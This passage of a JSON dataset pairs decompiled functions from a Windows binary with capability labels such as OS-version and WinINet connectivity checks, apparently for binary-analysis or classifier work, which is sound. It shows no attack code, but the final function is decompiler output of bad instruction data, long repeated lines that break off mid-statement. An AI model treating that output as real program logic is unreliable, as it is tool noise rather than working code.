arg_8h + 0x9fc, arg_8h + 0xe7c);\n            iVar1 = *(arg_8h + 0x1af40);\n        }\n        else {\n            fcn.00426410(arg_8h, arg_14h + 4, 3);\n            fcn.004284a0(arg_8h, *(arg_8h + 0xfa8) + 1, *(arg_8h + 0xfc4) + 1, iVar1 + 1);\n            fcn.00428540(arg_8h, arg_8h + 0x14, arg_8h + 0x908);\n            iVar1 = *(arg_8h + 0x1af3c);\n        }\n        uVar2 = *(arg_8h + 0x1af48) + 3 + iVar1;\n        *(arg_8h + 0x1af44) = *(arg_8h + 0x1af44) + (uVar2 >> 3);\n        *(arg_8h + 0x1af48) = uVar2 & 7;\n    }\n    else {\n        fcn.00426410(arg_8h, arg_14h, 3);\n        *(arg_8h + 0x1af44) = *(arg_8h + 0x1af44) + (*(arg_8h + 0x1af48) + 10U >> 3) + 4 + arg_10h;\n        *(arg_8h + 0x1af48) = 0;\n        fcn.004265a0(arg_8h, arg_ch, arg_10h, 1);\n    }\n    fcn.00425d40(arg_8h);\n    if (arg_14h != 0) {\n        fcn.004264b0(arg_8h);\n        *(arg_8h + 0x1af48) = *(arg_8h + 0x1af48) + 7;\n    }\n    return (*(arg_8h + 0x1af48) >> 3) + *(arg_8h + 0x1af44);\n}\n",
        "token_count": 876
    },
    "00429f90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429f90(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (arg_8h == NULL) {\n        *0x46938c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46938c = 0x80000;\n        return;\n    }\n    *0x46938c = fcn.00429630(arg_ch, arg_10h, 0, 2);\n    return;\n}\n",
        "token_count": 124
    },
    "00429fe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429fe0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_8h == NULL) {\n        *0x46938c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46938c = 0x80000;\n        return;\n    }\n    *0x46938c = fcn.00429630(arg_ch, arg_10h, arg_14h, 3);\n    return;\n}\n",
        "token_count": 132
    },
    "0042a030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a030(int32_t *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = 0;\n        }\n        *0x46938c = 0x10000;\n        return;\n    }\n    if (*arg_8h != 2) {\n        *0x46938c = 0x80000;\n        return;\n    }\n    iVar1 = arg_8h[1];\n    if (*(iVar1 + 0x2c) == '\\0') {\n        fcn.004288d0();\n    }\n    *(iVar1 + 0x2c) = 1;\n    if (arg_ch != NULL) {\n        *arg_ch = *(iVar1 + 0x20);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = *(iVar1 + 0x18);\n    }\n    *0x46938c = (-(*(iVar1 + 0x20) != 0) & 0xfffe0000) + 0x20000;\n    return;\n}\n",
        "token_count": 293
    },
    "0042a0c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042a0c0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == NULL) {\n        *0x46938c = 0x10000;\n        return 0x10000;\n    }\n    if (*arg_8h != 2) {\n        *0x46938c = 0x80000;\n        return 0x80000;\n    }\n    iVar1 = arg_8h[1];\n    *0x46938c = fcn.004294b0();\n    if (iVar1 != 0) {\n        fcn.00427f70(1);\n    }\n    fcn.0042ac49(arg_8h);\n    return *0x46938c;\n}\n",
        "token_count": 175
    },
    "0042ab33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042ab33(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = arg_ch & 4;\n    uVar2 = arg_ch & 0x80;\n    uVar1 = 1;\n    if ((arg_ch & 0x40) != 0) {\n        arg_ch = arg_ch | 1;\n    }\n    if ((arg_ch & 8) != 0) {\n        arg_ch = arg_ch | 2;\n    }\n    iVar4 = 0;\n    do {\n        if (uVar1 == (arg_ch & 0xffffff3b)) break;\n        uVar1 = *(iVar4 * 4 + 0x448958);\n        iVar4 = iVar4 + 1;\n    } while (uVar1 != 0);\n    if (*(iVar4 * 4 + 0x448954) != 0) {\n        if (((uVar2 == 0) || ((arg_ch & 10) == 0)) || (arg_8h_00 = fcn.0042aa6c(arg_8h, 0, arg_10h),  arg_8h_00 == 0)) {\n            arg_8h_00 = fcn.0042aa6c(arg_8h, iVar4, arg_10h);\n            if (arg_8h_00 == 0) {\n                return 0;\n            }\n            if (uVar3 == 0) {\n                return arg_8h_00;\n            }\n            iVar4 = fcn.0043058e(arg_8h_00, 0, 2);\n            if (iVar4 == 0) {\n                return arg_8h_00;\n            }\n        }\n        fcn.0042e82f(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 456
    },
    "0042aeff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042aeff(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (**0x4400b4)(*0x469f60, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0043064c();\n            uVar3 = (**0x4400b0)();\n            uVar3 = fcn.0043060a(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0042ad2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ad2a(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x456900) {\n        return;\n    }\n    *0x4696f8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4696fc = &arg_8h;\n    *0x469638 = 0x10001;\n    *0x4695e0 = 0xc0000409;\n    *0x4695e4 = 1;\n    var_328h = *0x456900;\n    var_324h = *0x456904;\n    *0x4695ec = unaff_retaddr;\n    *0x4696c4 = in_GS;\n    *0x4696c8 = in_FS;\n    *0x4696cc = in_ES;\n    *0x4696d0 = in_DS;\n    *0x4696d4 = unaff_EDI;\n    *0x4696d8 = unaff_ESI;\n    *0x4696dc = unaff_EBX;\n    *0x4696e0 = in_EDX;\n    *0x4696e4 = in_ECX;\n    *0x4696e8 = in_EAX;\n    *0x4696ec = unaff_EBP;\n    *0x4696f0 = unaff_retaddr;\n    *0x4696f4 = in_CS;\n    *0x469700 = in_SS;\n    *0x469630 = (**0x4400e8)();\n    fcn.00439a15(1);\n    (**0x4400e4)(0);\n    (**0x4400e0)(0x449878);\n    if (*0x469630 == 0) {\n        fcn.00439a15(1);\n    }\n    uVar1 = (**0x440028)(0xc0000409);\n    (**0x4400dc)(uVar1);\n    return;\n}\n",
        "token_count": 806
    },
    "0042b30b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b30b(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0042aeff(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "0042bb73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042bb73(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x42b01e;\n        var_38h = 1;\n    }\n    else {\n        uStack40 = 0x42b04a;\n        uStack36 = *0x456900 ^ &var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00432e72();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 701
    },
    "00430837": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00430837(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00432e72();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00432e72();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0043183e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00431944: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00431949)\n// WARNING: Removing unreachable block (ram,0x00431978)\n// WARNING: Removing unreachable block (ram,0x0043194f)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043183e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44e990, 0x20);\n    fcn.004348eb(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = *0x4400a4;\n    if (*0x469934 != 1) {\n        *0x469930 = 1;\n        *0x46992c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (**0x4400a4)(*0x46a448);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x46a444);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00432cc2();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00432cc2();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x46a448);\n                        piVar2 = (*pcVar1)(*0x46a444);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4401f4;\n            while (*(unaff_EBP + -0x1c) < 0x440200) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x440204;\n        while (*(unaff_EBP + -0x20) < 0x440208) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00434812(8);\n    }\n    return;\n}\n",
        "token_count": 998
    },
    "0043993a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043993a(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00434812(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00405690": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __fastcall fcn.00405690(uint param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    uVar7 = 0;\n    if (*(unaff_EDI + 0x46) != 0) {\n        puVar8 = *(unaff_EDI + 0x138) + 0x24;\n        do {\n            if ((*puVar8 & 0x20) != 0) {\n                *puVar8 = *puVar8 | 0x60000000;\n            }\n            puVar5 = *puVar8 >> 0x1d;\n            switch(puVar5) {\n            case NULL:\n            case 0x6:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1:\n                uVar3 = *puVar8 >> 0x1d;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                *puVar5 = *puVar5 + uVar3;\n                uVar1 = *puVar5;\n                *puVar5 = *puVar5 + uVar3;\n                uVar4 = param_2 >> 8;\n                uVar4 = uVar3 + uVar4 + CARRY1(uVar1, uVar3) & uVar4;\n                pcVar2 = uVar4;\n                *pcVar2 = 